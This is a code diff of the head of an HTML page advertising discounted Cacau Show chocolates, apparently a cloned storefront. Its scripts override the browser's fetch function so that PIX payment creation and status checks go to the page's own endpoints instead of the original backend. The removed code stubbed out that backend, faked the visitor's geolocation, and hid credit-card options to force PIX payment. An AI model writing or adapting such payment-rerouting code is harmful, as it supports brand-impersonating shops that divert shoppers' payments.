@@ -17,112 +17,57 @@
     <meta property="og:description" content="Aproveite os melhores precos em chocolates Cacau Show!">
     
 <script>
-  // Isso desativa o Supabase antes mesmo do site carregar
-  window.Dc = { 
-    functions: { 
-      invoke: function() { 
-        return Promise.resolve({ data: { success: true }, error: null }); 
-      } 
-    } 
-  };
-  // Isso resolve o erro do ipapi que trava o loading
-  window.fetch_original = window.fetch;
-  window.fetch = function() {
-    if (arguments[0].includes('ipapi.co')) {
-      return Promise.resolve({
-        ok: true,
-        json: () => Promise.resolve({ ip: '127.0.0.1', city: 'Sao Paulo' })
-      });
+  (function () {
+    if (typeof window === "undefined" || typeof window.fetch !== "function") {
+      return;
     }
-    return window.fetch_original.apply(this, arguments);
-  };
+
+    var originalFetch = window.fetch.bind(window);
+    // Trava para evitar loops: salva a resposta do PIX por referência externa
+    var pixCache = null;
+
+    function resolveUrl(input) {
+      if (typeof input === "string") return input;
+      if (input && typeof input.url === "string") return input.url;
+      return "";
+    }
+
+    window.fetch = function (input, init) {
+      var url = resolveUrl(input);
+
+      // Interceptar criação de PIX
+      if (url.indexOf("/functions/v1/create-pix-transaction") !== -1) {
+        // Se já geramos um PIX nesta sessão, retorna o cache para parar o loop
+        if (pixCache) {
+          return Promise.resolve(pixCache.clone());
+        }
+
+        return originalFetch("/api/create-pix-transaction", init).then(function(response) {
+          if (response.ok) {
+            // Salva a resposta e clona para o retorno
+            var clonedResponse = response.clone();
+            pixCache = clonedResponse; 
+            return response;
+          }
+          return response;
+        });
+      }
+
+      // Interceptar checagem de status
+      if (url.indexOf("/functions/v1/check-transaction-status") !== -1) {
+        var normalizedUrl = url;
+        try {
+          normalizedUrl = new URL(url, window.location.origin).toString();
+        } catch (_) {}
+
+        var query = normalizedUrl.indexOf("?") !== -1 ? normalizedUrl.slice(normalizedUrl.indexOf("?")) : "";
+        return originalFetch("/api/check-transaction-status" + query, init);
+      }
+
+      return originalFetch(input, init);
+    };
+  })();
 </script>
-    <script>
-      (function () {
-        if (typeof window === "undefined" || typeof window.fetch !== "function") {
-          return;
-        }
-
-        var originalFetch = window.fetch.bind(window);
-
-        function resolveUrl(input) {
-          if (typeof input === "string") return input;
-          if (input && typeof input.url === "string") return input.url;
-          return "";
-        }
-
-        window.fetch = function (input, init) {
-          var url = resolveUrl(input);
-
-          if (url.indexOf("/functions/v1/create-pix-transaction") !== -1) {
-            return originalFetch("/api/create-pix-transaction", init);
-          }
-
-          if (url.indexOf("/functions/v1/check-transaction-status") !== -1) {
-            var normalizedUrl = url;
-            try {
-              normalizedUrl = new URL(url, window.location.origin).toString();
-            } catch (_) {}
-
-            var query = normalizedUrl.indexOf("?") !== -1 ? normalizedUrl.slice(normalizedUrl.indexOf("?")) : "";
-            return originalFetch("/api/check-transaction-status" + query, init);
-          }
-
-          return originalFetch(input, init);
-        };
-      })();
-    </script>
-    <script>
-      (function () {
-        if (typeof window === "undefined" || typeof document === "undefined") {
-          return;
-        }
-
-        function normalizeText(value) {
-          return String(value || "")
-            .normalize("NFD")
-            .replace(/[\u0300-\u036f]/g, "")
-            .toLowerCase();
-        }
-
-        function enforcePixOnly() {
-          var buttons = Array.prototype.slice.call(document.querySelectorAll("button"));
-          var pixToggle = null;
-
-          buttons.forEach(function (btn) {
-            var text = normalizeText(btn.textContent);
-
-            if (!pixToggle && text.indexOf("pix") !== -1 && text.indexOf("desconto") !== -1) {
-              pixToggle = btn;
-            }
-
-            if (
-              text.indexOf("cartao de credito") !== -1 ||
-              text.indexOf("finalizar via cartao") !== -1
-            ) {
-              btn.style.display = "none";
-              btn.disabled = true;
-            }
-          });
-
-          if (pixToggle && !pixToggle.dataset.pixSelectedForced) {
-            pixToggle.dataset.pixSelectedForced = "1";
-            pixToggle.click();
-          }
-        }
-
-        enforcePixOnly();
-
-        var observer = new MutationObserver(function () {
-          enforcePixOnly();
-        });
-
-        observer.observe(document.documentElement, {
-          childList: true,
-          subtree: true,
-        });
-      })();
-    </script>
     <script type="module" crossorigin src="assets/index-SbekvIi0.js"></script>
     <link rel="stylesheet" crossorigin href="assets/index-CQVhuwHR.css">
   </head>
